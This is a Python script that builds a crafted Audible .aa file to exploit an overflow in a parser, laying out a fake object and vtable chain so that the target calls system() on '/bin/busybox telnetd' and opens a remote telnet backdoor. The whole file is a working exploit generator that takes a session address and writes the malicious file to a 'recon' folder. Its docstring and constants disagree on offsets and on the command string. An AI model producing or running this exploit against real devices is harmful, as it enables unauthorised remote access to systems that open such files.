#!/usr/bin/env python3
"""Build the AIMED two-stage overflow .aa given the session address S.

Chain (all offsets relative to the strcpy destination session+6380):
  fake_ptr F = S + 6380 + K_F          (K_F: where the fake object starts)
  [F+6404]  = A = S + 6380 + K_A       (attacker dword)
  [A+8]     = B = S + 6380 + K_B       (attacker dword; B = command string addr)
  [B+28]    = 0x6DCE50                  (system@plt, S2 86.10 static)
  string at B: "telnetd -p 2323\0"

Wire format: TOC {type=2, off=0x25, len=24000} + payload; observer cell at
node offset 23620 = file offset 23656 (proven layout: magic 4 + TOC 27 + codec 5 = 36; 36+23620=23656).
"""
import struct, sys

S2_SYSTEM_PLT = 0x6DCE50
NODE_OFF_OBSERVER = 23620          # node offset of the observer cell
FILE_OFF_OBSERVER = 23657          # = 23620 + 37 (TOC+codec header)
CMD = b"/bin/busybox telnetd\x00"


def build(S: int, k_f: int = 0, k_a: int = 100, k_b: int = 200) -> bytes:
    buf = bytearray(24000)
    # 4-level chain: [F+6404]=A; [A+8]=B; [B]=V (vtable); FN=[V+28]; r3 at call = V.
    # The command string lives AT V (r3 = V = the string for system()).
    k_v = k_b + 400                     # vtable V well clear of B
    buf[k_v : k_v + len(CMD)] = CMD     # system(V) → /bin/sh -c "<CMD>"
    # [V+28] = system@plt (FN). V+0..27 = cmd bytes; NUL-terminated before +28.
    buf[k_v + 28 : k_v + 32] = struct.pack(">I", S2_SYSTEM_PLT)
    # [B] = V  (the vtable pointer the dispatcher derefs)
    buf[k_b : k_b + 4] = struct.pack(">I", S + 6380 + k_v)
    # observer cell at node offset 23620: fake_ptr = F = S+6380+k_f
    F = S + 6380 + k_f
    buf[NODE_OFF_OBSERVER : NODE_OFF_OBSERVER + 4] = struct.pack(">I", F)
    buf[NODE_OFF_OBSERVER + 4 : NODE_OFF_OBSERVER + 8] = struct.pack(">I", 1)   # generation
    buf[NODE_OFF_OBSERVER + 8] = 1                                             # changed
    # A dword at node offset K_A (fake object's +6404 slot is A = S+6380+K_A...)
    # The dispatcher reads [F+6404] — F+6404 must land in our buffer:
    # F = S+6380+k_f → F+6404 = S+6380+(k_f+6404) → that's node offset k_f+6404.
    a_node = k_f + 6404
    A = S + 6380 + k_a
    buf[a_node : a_node + 4] = struct.pack(">I", A)
    # [A+8]: A = S+6380+k_a → A+8 = S+6380+(k_a+8) → node offset k_a+8 holds B
    B = S + 6380 + k_b
    buf[k_a + 8 : k_a + 12] = struct.pack(">I", B)
    # (FN now lives at [V+28]; [B] points at V.)

    out = bytearray(bytes([0x57, 0x90, 0x75, 0x36]))
    out += struct.pack(">BII", 1, 5, 5)
    out += struct.pack(">BII", 2, 0x25, len(buf))
    out += struct.pack(">BII", 0, 0, 0)
    out += b"acelp"
    out += bytes(buf)
    return bytes(out)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        print("usage: aimed_builder.py SESSION_ADDR_HEX [outfile]")
        raise SystemExit(1)
    S = int(sys.argv[1], 16)
    out = build(S)
    fn = sys.argv[2] if len(sys.argv) > 2 else f"recon/tnzm_audible/AIMED_{S:08x}.aa"
    open(fn, "wb").write(out)
    print(f"wrote {fn} ({len(out)} bytes) for S={S:#x}")
